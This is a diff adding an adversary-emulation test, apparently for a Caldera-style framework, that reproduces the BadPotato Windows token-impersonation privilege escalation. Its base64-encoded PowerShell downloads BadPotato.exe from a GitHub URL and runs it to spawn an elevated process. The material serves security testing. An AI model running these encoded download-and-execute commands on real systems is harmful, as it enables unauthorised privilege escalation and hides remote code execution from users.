@@ -1,0 +1,24 @@
+- id: fb3303b5-a7db-5dc3-bf57-c6af662e3c95
+  name: Soumaia ART Tests - Bad Potato
+  description: 'https://github.com/BeichenDream/BadPotato
+
+    Privilege escalation using named pipe connections (requires elevation)'
+  tactic: stealth
+  technique:
+    attack_id: T1134.001
+    name: 'Access Token Manipulation: Token Impersonation/Theft'
+  platforms:
+    windows:
+      psh:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIAJABlAG4AdgA6AFQARQBNAFAAXABBAFIAVAAtAEUAeAB0AGUAcgBuAGEAbABQAGEAeQBsAG8AYQBkAHMAXABCAGEAZABQAG8AdABhAHQAbwAuAGUAeABlACIAKQAgAHsAZQB4AGkAdAAgADAAfQAgAGUAbABzAGUAIAB7AGUAeABpAHQAIAAxAH0ACgA=
+          if ($LASTEXITCODE -ne 0) {
+              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAQQBSAFQALQBFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzACIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAEkAZwBuAG8AcgBlACAALQBGAG8AcgBjAGUAIAB8ACAATwB1AHQALQBOAHUAbABsAAoASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBPAHUAdABGAGkAbABlACAAIgAkAGUAbgB2ADoAVABFAE0AUABcAEEAUgBUAC0ARQB4AHQAZQByAG4AYQBsAFAAYQB5AGwAbwBhAGQAcwBcAEIAYQBkAFAAbwB0AGEAdABvAC4AZQB4AGUAIgAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwByAGUAZABjAGEAbgBhAHIAeQBjAG8ALwBhAHQAbwBtAGkAYwAtAHIAZQBkAC0AdABlAGEAbQAvAGIAbABvAGIALwBtAGEAcwB0AGUAcgAvAGEAdABvAG0AaQBjAHMALwBUADEAMQAzADQALgAwADAAMQAvAGIAaQBuAC8AQgBhAGQAUABvAHQAYQB0AG8ALgBlAHgAZQA/AHIAYQB3AD0AdAByAHUAZQAiAAoA
+          }
+          cd "$env:TEMP\ART-ExternalPayloads"
+          Start-Process .\BadPotato.exe notepad.exe
+          Start-Sleep -Second 20
+          Stop-Process -Name "notepad" -force -erroraction silentlycontinue
+          Stop-Process -Name "BadPotato" -force -erroraction silentlycontinue
+        cleanup: |-
+          taskkill /f /im notepad.exe
